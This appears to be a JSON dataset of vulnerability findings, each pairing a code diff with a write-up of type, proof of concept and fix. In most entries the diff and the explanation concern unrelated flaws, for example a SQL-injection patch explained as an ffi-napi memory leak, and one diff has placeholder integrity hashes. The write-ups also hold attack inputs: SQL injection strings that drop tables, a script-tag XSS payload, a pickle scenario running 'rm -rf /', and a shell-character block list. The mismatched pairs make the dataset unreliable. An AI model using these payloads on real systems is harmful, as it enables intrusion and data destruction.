consent. This compromises the confidentiality and integrity of user data.\n\n\nSuggested Fix: Sanitize all external HTML data before injecting it into the DOM. Use a trusted HTML sanitizer library like `DOMPurify` to clean user-controlled or API-sourced HTML content, ensuring that only safe tags and attributes are allowed through."
    },
    "29": {
        "diff": "diff --git a/golden_patch_sql_injection.js b/golden_patch_sql_injection.js\nnew file mode 100644\nindex 0000000..e69de29\n--- /dev/null\n+++ b/golden_patch_sql_injection.js\n@@ -0,0 +1,30 @@\n+const express = require('express');\n+const mysql   = require('mysql');\n+const app     = express();\n+const port    = 3000;\n+\n+// Use a secure connection pool\n+const db = mysql.createPool({\n+  host: 'localhost',\n+  user: 'your_user',\n+  password: 'your_password',\n+  database: 'your_database'\n+});\n+\n+// Secure route using parameterized query\n+app.get('/user', (req, res) => {\n+  const username = req.query.username;\n+  const query    = 'SELECT * FROM users WHERE username = ?';\n+  db.query(query, [username], (err, result) => {\n+    if (err) {\n+      console.error('Database error:', err);\n+      return res.status(500).send('Internal Server Error');\n+    }\n+    res.json(result);\n+  });\n+});\n+\n+app.listen(port, () => {\n+  console.log(`Server is running on http://localhost:${port}`);\n+});\n",
        "explanation": "Vulnerability Type: CWE-401: Improper Release of Memory Before Removing Last Reference ('Memory Leak')\n\nOWASP Category: A09:2021 \u2013 Security Logging and Monitoring Failures\n\nProof of Concept:\nconst ffi = require('ffi-napi');\nconst libc = ffi.Library('libc', { 'atoi': ['int', ['string']] });\nfor (let i = 0; i < 1e6; i++) libc.atoi('123');\nThis repeatedly calls a native function, but memory use increases.\n\nSeverity: Low (2)\n\nRoot Cause: The ffi-napi library does not correctly free internal resources when repeatedly calling native functions in rapid succession. This leads to memory not being released back to the system.\n\nExploit Scenario: An attacker or developer using ffi-napi to call C functions in a loop (e.g., from user input or automation) could cause memory usage to balloon over time, eventually leading to degraded performance or a crash.\n\nWhy It Happens: ffi-napi wraps native function calls in a way that allocates memory behind the scenes, but it does not properly dispose of these allocations after use.\n\nSecurity Implications: If abused, this vulnerability can lead to a denial-of-service through memory exhaustion, especially in long-running or sensitive processes like servers or CLI tools.\n\nSuggested Fix: Avoid excessive looping of native calls, ensure all returned pointers are cleaned up, and consider using a memory-managed alternative or pooling mechanism to manage native interop more safely."
    },
    "143": {
        "diff": "@@ -63,7 +63,9 @@\n                 for (var j = 0; j < cells.length; j++) {\n                     var cell = row.insertCell(-1);\n-                    cell.innerHTML = cells[j];\n+                    // Avoid using innerHTML directly to prevent XSS\n+                    var textNode = document.createTextNode(cells[j]);\n+                    cell.appendChild(textNode);\n                 }\n             }\n         }\n",
        "explanation": "Vulnerable Code:\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n        \n        # Check if the provided credentials match the static credentials\n        if username in static_users and static_users[username] == password:\n            if username == 'admin':\n                session['role'] = 'admin'\n            elif username == 'user':\n                session['role'] = 'user'\n                session['username'] = username\n                \n                # Add the username to the active_users set\n                active_users.add(session['username'])\n            \n            return redirect(f'/{username}')\n        else:\n            flash('Invalid credentials')\n    \n    return render_template('signin.html')\n\nRoot Cause Analysis:\nThe application lacks rate limiting or brute-force protection on the login endpoint (/).\nNo mechanism is in place to limit the number of login attempts from a single IP address or user.\nNo account lockout policy is implemented after consecutive failed login attempts.\n\nExploit Scenarios:\nBrute Force Attack:\nAn attacker sends automated login attempts with a list of passwords to gain unauthorized access.\nThe absence of rate limiting allows for thousands of attempts without restriction.\nCredential Stuffing:\nAn attacker uses leaked credentials from other platforms to attempt logins.\nNo mechanism is in place to detect or mitigate this behavior.\nDenial of Service (DoS):\nAn attacker overwhelms the login endpoint with requests, consuming server resources and potentially denying service to legitimate users.\n\nWhy This Happens:\nThe login endpoint does not implement rate limiting or IP-based throttling.\nDevelopers may have overlooked the importance of brute-force protection during development.\nThe application is not designed to detect or mitigate repeated failed login attempts.\n\nSecurity Implications:\n1. Unauthorized Access\n2. Credential Stuffing\n3. Denial of Service (DoS)\n\nSuggested Fix:\nImplement rate limiting on the login endpoint using Flask-Limiter or similar libraries.\nAdd account lockout functionality after a specified number of failed login attempts.\nLog failed login attempts for monitoring and auditing purposes.\n\nCode Example with Fix:\n\nfrom flask_limiter import Limiter\nfrom flask_limiter.util import get_remote_address\n\n# Initialize the limiter\nlimiter = Limiter(get_remote_address, app=app)\n\n@app.route('/', methods=['GET', 'POST'])\n@limiter.limit(\"5 per minute\")  # Limit to 5 login attempts per minute per IP\ndef index():\n    if request.method == 'POST':\n        username = request.form.get('username')\n        password = request.form.get('password')\n        \n        # Check if the provided credentials match the static credentials\n        if username in static_users and static_users[username] == password:\n            if username == 'admin':\n                session['role'] = 'admin'\n            elif username == 'user':\n                session['role'] = 'user'\n                session['username'] = username\n                \n                # Add the username to the active_users set\n                active_users.add(session['username'])\n            \n            return redirect(f'/{username}')\n        else:\n            flash('Invalid credentials')\n    \n    return render_template('signin.html')\nAdditional Enhancements:\nImplement account lockout after 3\u20135 consecutive failed attempts.\nUse CAPTCHA to prevent automated login attempts.\nLog the IP address and timestamp of failed login attempts for monitoring."
    },
    "144": {
        "diff": "--- 0544_copy_avatar_images.py\t2025-04-27\n+++ 0544_copy_avatar_images_fixed.py\t2025-04-27\n@@\n- old_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user))\n- new_base = os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user))\n+ old_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), old_hash(user)))\n+ new_base = os.path.realpath(os.path.join(settings.LOCAL_AVATARS_DIR, str(user.realm_id), new_hash(user)))\n+\n+ if not old_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)) or not new_base.startswith(os.path.realpath(settings.LOCAL_AVATARS_DIR)):\n+     raise ValueError(\"Invalid file path detected\")\n\n # Then proceed with os.remove, os.link, open(), etc.\n",
        "explanation": "The code contains two high severity vulnerabilities inlcuding CWE-89-SQL_Injection and CWE-256-Unprotected_Storage_of_Credentials\n\n==================================================\n\nCWE-89:\nExplanation:\nAll SQL queries in the code are constructed by directly interpolating user-supplied data into SQL statements using Python f-strings. This allows attackers to inject arbitrary SQL code, which can lead to unauthorized data access, data modification, or even deletion of the entire database.\n\n\nPOC:\n\n# Malicious email input to extract all user passwords\nlogin(\"anything' OR '1'='1\", \"irrelevant\")\n# Or, during signup, inject SQL to add an admin user or drop tables\nsignup(\"test@example.com', 'hacker', 'x', '123', 'pass'); DROP TABLE users; --\", \"hacker\", \"x\", \"123\", \"pass\")\n\n\nRoot Cause: File userdata.py\nLine 9, 15, 27, 33, 43, 50, 56, 61, 66, 71, 76: All SQL queries use f-strings with unescaped user input, e.g.:\n\nmc.execute(f\"SELECT password FROM users WHERE email = '{email}'\")  # line 15\nmc.execute(f\"INSERT INTO users ... VALUES (..., '{email}', ... )\")  # line 27\nmc.execute(f\"UPDATE users SET ... WHERE user_id ={user_id} \")  # line 61\n\n\nExploit Scenario:\nAn attacker crafts input such as email = \"foo' OR '1'='1\" to the login or get_details function, causing the query to return all users\u2019 data or bypass authentication.\nIn the signup function, an attacker can inject SQL to drop tables or create new admin users.\n\n\nWhy it Happens:\nThe code directly inserts user-controlled input into SQL queries without using parameterized statements or escaping, making it vulnerable to SQL injection attacks.\n\n\nSecurity Implications:\nAttackers can bypass authentication, extract sensitive data, modify or delete records, and potentially destroy the entire database.\n\n\nSuggested Fix:\nUse parameterized queries (prepared statements) provided by the mysql.connector library.\n\nPatch Fix for login function:\n\npython\ndef login(email, password):\n    mc.execute(\"SELECT password FROM users WHERE email = %s\", (email,))\n    detail = mc.fetchall()\n    try:\n        passw = detail[0][0]\n        if passw == password:\n            return True\n        else:\n            return False\n    except:\n        return False\n\nApply this fix to all SQL queries, replacing f-string interpolation with parameterized placeholders (%s) and passing user input as a tuple argument.\n\n=================================================================\n\nCWE-256:\n\nExplanation:\nPasswords are stored and compared in plaintext, both in the database and in the application logic. This exposes user credentials to anyone with database access and increases the risk of credential theft.\n\n\nPOC:\nAnyone with database access can run SELECT password FROM users and retrieve all user passwords in plaintext.\n\n\nRoot Cause: File userdata.py\nLine 27, 61, 66: Passwords are stored and updated directly as plaintext:\n\nmc.execute(f\"INSERT INTO users ... '{sign_password}' ...\")  # line 27\nmc.execute(f\"UPDATE users SET password ='{password}' ...\")  # line 66\n\n\nExploit Scenario:\nIf the database is compromised, all user passwords are immediately exposed.\n\n\nWhy it Happens:\nThe code does not hash or salt passwords before storing or comparing them.\n\n\nSecurity Implications:\nUser accounts can be compromised through SQL injection above, and users who reuse passwords elsewhere are at risk.\n\n\nSuggested Fix:\nUse a secure password hashing algorithm such as bcrypt.\n\nPatch Fix for signup and login:\n\nimport bcrypt\n\ndef signup(email, name, address, phnumber, sign_password):\n    hashed = bcrypt.hashpw(sign_password.encode(), bcrypt.gensalt())\n    mc.execute(\"INSERT INTO users (user_id, email, name, password, address, phonenumber) VALUES (DEFAULT, %s, %s, %s, %s, %s)\",\n               (email, name, hashed.decode(), address, phnumber))\n    db.commit()\n    return True\n\ndef login(email, password):\n    mc.execute(\"SELECT password FROM users WHERE email = %s\", (email,))\n    detail = mc.fetchall()\n    try:\n        hashed = detail[0][0].encode()\n        if bcrypt.checkpw(password.encode(), hashed):\n            return True\n        else:\n            return False\n    except:\n        return False"
    },
    "128": {
        "diff": "@@ <head>\n-  <link rel=\"stylesheet\" href=\"http://cdn.leafletjs.com/leaflet-0.7.2/leaflet.css\" />\n-  <script src=\"http://cdn.leafletjs.com/leaflet-0.7.2/leaflet.js\"></script>\n+  <link rel=\"stylesheet\" href=\"https://cdn.leafletjs.com/leaflet-0.7.2/leaflet.css\"\n+    integrity=\"sha384-INSERT-CORRECT-HASH-HERE\" crossorigin=\"anonymous\" />\n+  <script src=\"https://cdn.leafletjs.com/leaflet-0.7.2/leaflet.js\"\n+    integrity=\"sha384-INSERT-CORRECT-HASH-HERE\" crossorigin=\"anonymous\"></script>\n\n-  <script src=\"../cesium/Build/Cesium/Cesium.js\"></script>\n+  <script src=\"../cesium/Build/Cesium/Cesium.js\"></script> <!-- Local script, no integrity needed -->\n\n-  <script src=\"http://localhost:9810/compile?id=api-debug\"></script>\n+  <script src=\"http://localhost:9810/compile?id=api-debug\"></script> <!-- Localhost for dev testing -->\n",
        "explanation": "Vulnerability Type:\nCWE-20: Improper Input Validation\n\nProof of Concept:\n\n\nimport torch\n\n# Bad practice: vulnerable to code execution via pickle\nmodel = torch.load('model.pkl')\nThis line is dangerous because torch.load() uses Python\u2019s pickle module, which executes arbitrary code during deserialization. If model.pkl contains malicious pickle payloads, executing this line may result in arbitrary code execution. This is especially risky if the .pkl file was downloaded or received from an untrusted source.\n\nSeverity:\nHIGH\n\nRoot Cause:\nThe root cause is using torch.load() to deserialize data from untrusted sources without validating its contents. PyTorch internally uses pickle, which does not restrict what classes or code can be executed.\n\nExploit Scenario:\nAn attacker uploads a malicious .pkl file containing a __reduce__() method that executes os.system(\"rm -rf /\"). When the file is loaded via torch.load(), the attacker's code runs with full privileges.\n\nWhy It Happens:\nThe vulnerability occurs because torch.load() does not enforce strict input validation or safe deserialization. The function assumes that the content is trustworthy and allows execution of any code defined in the pickled object.\n\nSecurity Implications:\nIf exploited, an attacker could execute arbitrary system commands, read or write files, install malware, or completely compromise the host system. This is particularly severe in shared or production environments.\n\nSuggested Fix:\nAvoid using torch.load() for loading model files from unknown sources. Instead:\n\nSave only the state_dict of the model.\n\nLoad using torch.load() only if the contents are expected to be a dict.\n\nAlways validate the type of loaded object before using it.\n\n\n# Safer alternative\nmodel = MyModel()\nstate_dict = torch.load('model_state_dict.pth', map_location='cpu')\nif not isinstance(state_dict, dict):\n    raise ValueError(\"Invalid model file\")\nmodel.load_state_dict(state_dict)\n"
    },
    "117": {
        "diff": "diff --git a/internal/ssh/ssh.go b/internal/ssh/ssh.go\nindex abcdef1..1234567 100644\n--- a/internal/ssh/ssh.go\n+++ b/internal/ssh/ssh.go\n@@ func handleServerConn(keyID string, chans <-chan ssh.NewChannel) {\n     go func(in <-chan *ssh.Request) {\n         defer func() {\n             _ = ch.Close()\n         }()\n         for req := range in {\n-            payload := cleanCommand(string(req.Payload))\n+            rawPayload := string(req.Payload)\n+            // Reject payloads containing dangerous characters\n+            if strings.ContainsAny(rawPayload, \"&;|`$><\") {\n+                log.Error(\"SSH: Rejected suspicious payload: %v\", rawPayload)\n+                _ = ch.SendRequest(\"exit-status\", false, []byte{1, 0, 0, 0})\n+                return\n+            }\n+            payload := cleanCommand(rawPayload)\n             switch req.Type {\n             case \"env\":\n                 // We only need to accept the request and do nothing since whatever environment\n                 // variables being set here won't be used in subsequent commands anyway.\n",
        "explanation": "Vulnerability Analysis for workorder.js\nVulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept (Elaborated):\nVulnerable Code:\n$('#autoSuggestionsList').html(data);\n\nStep-by-Step Explanation:\n1.\tProblem:\ndata is fetched from a server-side API (autosuggest_scope) and directly inserted into the DOM using .html() without any sanitization.\n2.\tHow to Attack:\nIf an attacker can control or inject malicious payloads into the data returned from the server, it would get rendered directly as HTML, and any <script> inside would execute.\n3.\tEffect:\no\tArbitrary JavaScript Execution\no\tSession Hijacking\no\tPhishing attacks\no\tComplete compromise of the user session\n\nExample Exploit:\nIf data returned by the server is:\n<li><script>alert('XSS by attacker')</script></li>\nWhen inserted into:\n$('#autoSuggestionsList').html(data);\nResult:\n\u2022\tScript executes immediately\n\u2022\tAttacker gains control over the page context\n\nSeverity:\nCritical (Stored or Reflected DOM XSS \u2192 Full Session Hijack)\n\nRoot Cause:\nThe application blindly trusts the content received from the server and injects it into the DOM using .html() without validation, escaping, or sanitization.\n\nExploit Scenario:\nAn attacker tricks the server into responding with a malicious payload by injecting data into scope_input_string, or compromises the server response.\nWhen users interact with the auto-suggestion feature, the injected JavaScript code will execute in their browsers.\n\nWhy It Happens:\nBecause no content sanitization or escaping is performed before injecting dynamic content into the DOM via .html().\n\nSecurity Implications:\nIf exploited:\n\u2022\tAttacker can steal user cookies\n\u2022\tHijack user sessions\n\u2022\tPerform CSRF or phishing attacks\n\u2022\tInject keyloggers or spyware into the application\n\nSuggested Fix:\n--- workorder.js\t2025-04-27\n+++ workorder_fixed.js\t2025-04-27\n@@\n- $('#autoSuggestionsList').html(data);\n+ $('#autoSuggestionsList').html(DOMPurify.sanitize(data));\n\n"
    },
    "121": {
        "diff": "--- server.py\t2025-04-28 09:29:34.000000000 -0400\n+++ server-new.py\t2025-04-28 09:29:34.000000000 -0400\n@@ -1,37 +1,41 @@\n-import socket\n-\n-# Initialize Socket Instance\n-sock = socket.socket()\n-print (\"Socket created successfully.\")\n-\n-# Defining port and host\n-port = 8800\n-host = ''\n-\n-# binding to the host and port\n-sock.bind((host, port))\n-\n-# Accepts up to 10 connections\n-sock.listen(10)\n-print('Socket is listening...')\n-\n-while True:\n-    # Establish connection with the clients.\n-    con, addr = sock.accept()\n-    print('Connected with ', addr)\n-\n-    # Get data from the client\n-    data = con.recv(1024)\n-    print(data.decode())\n-    # Read File in binary\n-    file = open('server-file.txt', 'rb')\n-    line = file.read(1024)\n-    # Keep sending data to the client\n-    while(line):\n-        con.send(line)\n-        line = file.read(1024)\n-    \n-    file.close()\n-    print('File has been transferred successfully.')\n-\n-    con.close()\n+import socket\n+import ssl\n+\n+# SSL context setup\n+context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n+context.load_cert_chain(certfile='server.crt', keyfile='server.key')\n+\n+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n+sock.bind(('', 8800))\n+sock.listen(10)\n+print('Secure socket is listening...')\n+\n+while True:\n+    con, addr = sock.accept()\n+    try:\n+        # Wrap socket with SSL\n+        ssl_con = context.wrap_socket(con, server_side=True)\n+        print('Secure connection established with', addr)\n+\n+        # Simple authentication example (expecting a password)\n+        ssl_con.send(b'Password: ')\n+        password = ssl_con.recv(1024).decode().strip()\n+        if password != 'expected_password':\n+            ssl_con.send(b'Authentication failed.\\n')\n+            ssl_con.close()\n+            continue\n+\n+        ssl_con.send(b'Authentication successful. Sending file...\\n')\n+\n+        with open('server-file.txt', 'rb') as file:\n+            while True:\n+                data = file.read(1024)\n+                if not data:\n+                    break\n+                ssl_con.send(data)\n+\n+        print('File has been transferred successfully.')\n+    except Exception as e:\n+        print(f'Error: {e}')\n+    finally:\n+        ssl_con.close()\n",
        "explanation": "Explanation: The server creates a new thread for every client connection without limiting the number of concurrent clients, which can probably exhaust server resources. Although the probability is low, multiple connections can trigger a crash.\n\n\nPOC: An attacker opens many connections, causing the server to spawn many threads and possibly crash.\n\n\nRoot Cause: multiChatServer.py\nLine 21: Thread(target=handle_client, args=(client, client_address)).start() with no limit on thread count.\n\n\nExploit Scenario: Resource exhaustion by opening many connections.\n\n\nWhy it Happens: No connection throttling or thread pool management.\n\n\nSecurity Implications: Denial of service due to resource exhaustion.\n\n\nSuggested Fix:\nImplement connection limits or use a thread pool executor with max workers:\n\nPatch:\n\nfrom concurrent.futures import ThreadPoolExecutor\n\nexecutor = ThreadPoolExecutor(max_workers=50)  # limit to 50 clients\n\ndef accept_incoming_connections():\n    while True:\n        client, client_address = SOCK.accept()\n        executor.submit(handle_client, client, client_address)"
    },
    "119": {
        "diff": "--- files_old.py\t2025-04-28 08:59:13.000000000 -0400\n+++ files_old-new.py\t2025-04-28 08:59:13.000000000 -0400\n@@ -1,336 +1,383 @@\n-import os, shutil, configparser\n-import PySimpleGUI as sg\n-from pathlib import Path\n-from send2trash import send2trash\n-# Config files.ini\n-config = configparser.ConfigParser()\n-config.read('files.ini')\n-main_path = config['USER SETTINGS']['home_path']\n-if main_path == \"\":\n-    main_path = str(Path.home())\n-# Variables\n-sg.theme(\"SystemDefault1\")\n-icon = \"data/icon.png\"\n-folder_icon = \"data/icon_folder.png\"\n-file_icon = \"data/icon_file.png\"\n-home_icon = \"data/icon_home.png\"\n-up_icon = \"data/icon_up.png\"\n-treedata = sg.TreeData()\n-hidden = False\n-reverse = False\n-sort_size = False\n-size_list = []\n-count = 0\n-s = \"\u2610 Show hidden files\"\n-h = \"\u2611 Show hidden files\"\n-hidd = s\n-ab = \"\u25bc Reverse sort\"\n-ba = \"\u25b2 Reverse sort\"\n-revers = ba\n-nsort = \"\u21f5 Sort by name\"\n-ssort = \"\u21f5 Sort by size\"\n-sort = ssort\n-pd = \"\u274f Paste\"\n-pa = \"!\u274f Paste\"\n-paste = pa\n-c1 = \"\u2750 Copy\"\n-c2 = \"!\u2750 Copy\"\n-copy = c2\n-d1 = \"\u2718 Delete in trash\"\n-d2 = \"!\u2718 Delete in trash\"\n-delete = d2\n-r1 = \"\u270e Rename\"\n-r2 = \"!\u270e Rename\"\n-rename = r2\n-# Convert size\n-def add_size(name):\n-    s = os.stat(name).st_size\n-    if s < 1000:\n-        size = str(s) + \" B\"\n-    if s >= 1000:\n-        size = str(round(s/1000, 2)) + \" KB\"\n-    if s >= 1000000:\n-        size = str(round(s/1000000, 2)) + \" MB\"\n-    if s >= 1000000000:\n-        size = str(round(s/1000000000, 2)) + \" GB\"\n-    if s >= 1000000000000:\n-        size = str(round(s/1000000000000, 2)) + \" TB\"\n-    return [size, s]\n-# Updating files and folders\n-def add_files_in_folder(parent, dirname):\n-    files = os.listdir(dirname)\n-    if reverse == False:\n-        files.sort(key=str.lower)\n-    if reverse == True:\n-        files.sort(key=str.lower, reverse=True)\n-    global count\n-    global treedata\n-    treedata = sg.TreeData()\n-    for f in files:\n-        fullname = os.path.join(dirname, f)\n-        if hidden == False:\n-            if f.startswith(\".\"):\n-                continue\n-            elif os.path.isdir(fullname):\n-                treedata.Insert(parent, fullname, f, values=[], icon=folder_icon)\n-                count += 1\n-            else:\n-                continue\n-        elif os.path.isdir(fullname):\n-            treedata.Insert(parent, fullname, f, values=[], icon=folder_icon)\n-            count += 1\n-        else:\n-            continue\n-    for f in files:\n-        fullname = os.path.join(dirname, f)\n-        size = add_size(fullname)\n-        if sort_size == True:\n-            if hidden == False:\n-                if f.startswith(\".\"):\n-                    continue\n-                elif os.path.isdir(fullname):\n-                    continue\n-                else:\n-                    size_list_ml = [size[1], fullname, f, size[0]]\n-                    size_list.append(size_list_ml)\n-            elif os.path.isdir(fullname):\n-                continue\n-            else:\n-                size_list_ml = [size[1], fullname, f, size[0]]\n-                size_list.append(size_list_ml)\n-        else:\n-            if hidden == False:\n-                if f.startswith(\".\"):\n-                    continue\n-                elif os.path.isdir(fullname):\n-                    continue\n-                else:\n-                    treedata.Insert(parent, fullname, f, values=[size[0]], icon=file_icon)\n-                    count += 1\n-            elif os.path.isdir(fullname):\n-                continue\n-            else:\n-                treedata.Insert(parent, fullname, f, values=[size[0]], icon=file_icon)\n-                count += 1\n-    if sort_size == True:\n-        if reverse == False:\n-            size_list.sort(key=lambda size_list: size_list[0], reverse=True)\n-        if reverse == True:\n-            size_list.sort(key=lambda size_list: size_list[0])\n-        for s in size_list:\n-            treedata.Insert(parent, s[1], s[2], values=[s[3]], icon=file_icon)\n-            count += 1\n-        size_list.clear()\n-add_files_in_folder(\"\", main_path)\n-path_original = main_path\n-# The stuff inside app\n-menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-layout = [  [sg.ButtonMenu(\"\u2261\", menu_def, background_color=\"white\", key=\"-MENU-\"), sg.Button(image_size=(24,24), key=\"\u2191\", image_filename=up_icon), sg.Button(image_size=(24,24), key=\"\u2302\", image_filename=home_icon), sg.Input(default_text=main_path, key=\"-OUT1-\", expand_x=True, size=(50,1))],\n-            [sg.Tree(data=treedata, font=(\"Helvetica\",15), headings=[\"size\"], auto_size_columns=False, col_widths=[10], num_rows=None, col0_width=40, max_col_width=10, row_height=30, key=\"-TREE-\", enable_events=True)],\n-            [sg.Text(text=str(count) + \" objects\", key=\"-OUT111-\", justification=\"center\", size=(20,1)), sg.Input(default_text=main_path, readonly=True, key=\"-OUT11-\", size=(40,1), expand_x=True, visible=False)] ]\n-# Window params\n-window = sg.Window(\"Files\", layout, return_keyboard_events=True, element_justification=\"left\", debugger_enabled=False, resizable=True, margins=(0,0), finalize=True, font=(\"Helvetica\",15), icon=icon)\n-window.set_min_size((800,500))\n-window[\"-TREE-\"].expand(True, True)\n-# Main loop\n-while True:\n-    event, values = window.read()\n-    if event == sg.WIN_CLOSED:\n-        break\n-    up_string = values[\"-OUT1-\"]\n-    down_string = values[\"-OUT11-\"]\n-    window[\"-TREE-\"].bind(\"<Double-Button-1>\", \"double\")\n-    window[\"-TREE-\"].bind(\"<Button-1>\", \"click\")\n-    # Menus events\n-    if event == \"-MENU-\":\n-        event = values[\"-MENU-\"]\n-    if event == \"\u2610 Show hidden files\":\n-        hidden = True\n-        hidd = h\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u2611 Show hidden files\":\n-        hidden = False\n-        hidd = s\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u25b2 Reverse sort\":\n-        reverse = True\n-        revers = ab\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u25bc Reverse sort\":\n-        reverse = False\n-        revers = ba\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u21f5 Sort by size\":\n-        sort_size = True\n-        sort = nsort\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u21f5 Sort by name\":\n-        sort_size = False\n-        sort = ssort\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-        event = \"-TREE-double\"\n-    if event == \"\u2605 About...\":\n-        sg.popup(\"Files\", \"0.5\", \"A simple file explorer\", font=(\"Helvetica\",13), icon=icon)\n-    if event == \"\u2707 Settings\":\n-        layout_set = [  [sg.Text(\"Home directory\", size=(15,1)), sg.Input(default_text=main_path, key=\"-OUT2-\", size=(60,1)), sg.Button(\"Save\")],\n-                        [sg.Text(justification=\"right\", key=\"-OUT22-\", size=(60,1))] ]\n-        window_set = sg.Window(\"Settings\", layout_set, return_keyboard_events=True, element_justification=\"left\", debugger_enabled=False, modal=True, font=(\"Helvetica\",15), icon=icon)\n-        while True:\n-            event, values = window_set.read()\n-            if event == sg.WIN_CLOSED:\n-                break\n-            set_home_str = values[\"-OUT2-\"]\n-            if event == \"Save\":\n-                config['USER']['main_path'] = set_home_str\n-                with open('files.ini', 'w') as configfile:\n-                    config.write(configfile)\n-                main_path = set_home_str\n-                window_set[\"-OUT22-\"].update(\"settings saved\")\n-        window_set.close()\n-    # File operations\n-    if event == \"\u2750 Copy\":\n-        source = down_string\n-        source_edit = source.rsplit(\"/\", 1)\n-        paste = pd\n-        menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-        window[\"-MENU-\"].update(menu_definition=menu_def)\n-    if event == \"\u25a3 Paste\":\n-        if source != \"\":\n-            source_1 = os.path.join(source_edit[0], source_edit[1])\n-            if os.path.isdir(source_1):\n-                if source_edit[0] == path_original:\n-                    destination = path_original + \"/\" + source_edit[1] + \" (copy)\"\n-                else:\n-                    destination = path_original + \"/\" + source_edit[1]\n-                shutil.copytree(source, destination)\n-                source = \"\"\n-                source_edit = \"\"\n-                destination = \"\"\n-            else:\n-                if source_edit[0] == path_original:\n-                    destination = path_original + \"/\" + source_edit[1] + \" (copy)\"\n-                else:\n-                    destination = path_original + \"/\"\n-                shutil.copy2(source, destination)\n-                source = \"\"\n-                source_edit = \"\"\n-                destination = \"\"                \n-            paste = pa\n-            menu_def = [\"\u2261\", [hidd, revers, sort, copy, paste, delete, rename, \"\u2707 Settings\", \"\u2605 About...\"]]\n-            window[\"-MENU-\"].update(menu_definition=menu_def)\n-            event = \"-TREE-double\"\n-    if event == \"\u2718 Delete in trash\":\n-        del_path = down_string\n-        del_edit = del_path.rsplit(\"/\", 1)\n-        answer = sg.popup_yes_no(f\"Delete '{del_edit[1]}' in trash?\", font=(\"Helvetica\",13), no_titlebar=True)\n-        if answer == \"Yes\":\n-            if os.path.exists(del_path):\n-                send2trash(del_path)\n-                up_string = path_original\n-                down_string = path_original\n-                window[\"-OUT1-\"].update(up_string)\n-                window[\"-OUT11-\"].update(down_string)\n-                event = \"-TREE-double\"\n-    if event == \"\u270e Rename\":\n-        r_path = down_string\n-        r_edit = r_path.rsplit(\"/\", 1)\n-        if os.path.exists(r_path):\n-            save = \"not\"\n-            layout_r = [    [sg.Input(default_text=r_edit[1], key=\"-OUT3-\", size=(30,1))],\n-                            [sg.Button(\"Save\"), sg.Button(\"Cancel\")] ]\n-            window_r = sg.Window(\"Rename\", layout_r, return_keyboard_events=True, element_justification=\"center\", debugger_enabled=False, modal=True, font=(\"Helvetica\",15), no_titlebar=True)\n-            while True:\n-                event, values = window_r.read()\n-                if event == sg.WIN_CLOSED:\n-                    break\n-                rename_str = values[\"-OUT3-\"]\n-                if event == \"Save\":\n-                    save = \"ok\"\n-                    rename_str_f = r_edit[0] + \"/\" + rename_str\n-                    window_r.close()\n-                if event == \"Cancel\":\n-                    window_r.close()\n-            if save == \"ok\":\n-                os.rename(r_path, rename_str_f)\n-            event = \"-TREE-double\"\n-            up_string = path_original\n-            down_string = path_original\n-            window[\"-OUT1-\"].update(up_string)\n-            window[\"-OUT11-\"].update(down_string)\n-    # Screen with files and catalogs events\n-    if event == \"-TREE-click\":\n-        up_string = path_original\n-        down_string = path_original\n-        window[\"-OUT1-\"].update(up_string)\n-        window[\"-OUT11-\"].update(down_string)\n-    if event == \"-TREE-\":\n-        for row in values[event]:\n-            down_string = str(row)\n-            window[\"-OUT11-\"].update(down_string)\n-        for row in values[event]:\n-            up_string = str(row)\n-            path_string_e = up_string.rsplit(\"/\", 1)\n-            path_string_e1 = os.path.join(path_string_e[0], path_string_e[1])\n-            if os.path.isfile(path_string_e1):\n-                up_string = path_original\n-            window[\"-OUT1-\"].update(up_string)\n-    # Buttons events\n-    if event == \"\u2302\":\n-        up_string = main_path\n-        down_string = main_path\n-        event = \"-TREE-double\"\n-    if event == \"\u2191\":\n-        string_1 = path_original.rsplit(\"/\", 1)\n-        up_string = string_1[0]\n-        down_string = up_string\n-        if up_string == \"\":\n-            up_string = up_string + \"/\"\n-            down_string = up_string\n-        event = \"-TREE-double\"\n-    # Refresh layout\n-    try:\n-        if event == \"-TREE-double\" or event == \"KP_Enter:104\" or event == \"Return:36\":\n-            count = 0\n-            add_files_in_folder(\"\", up_string)\n-            path_original = up_string\n-            window[\"-TREE-\"].update(values=treedata)\n-            window[\"-OUT1-\"].update(up_string)\n-            window[\"-OUT11-\"].update(down_string)\n-            window[\"-OUT111-\"].update(str(count) + \" objects\")          